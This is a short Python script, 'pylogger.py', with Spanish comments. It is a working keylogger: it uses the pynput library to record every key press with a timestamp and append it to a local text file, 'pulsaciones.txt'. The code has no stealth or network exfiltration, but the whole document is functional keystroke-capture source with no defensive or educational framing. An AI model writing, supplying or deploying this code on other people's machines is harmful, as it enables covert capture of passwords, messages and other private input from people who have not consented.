# pylogger.py

from pynput import keyboard
from datetime import datetime

# Archivo de registro
log_file = "pulsaciones.txt"

# Función que escribe la tecla en el archivo
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

# Iniciar el listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()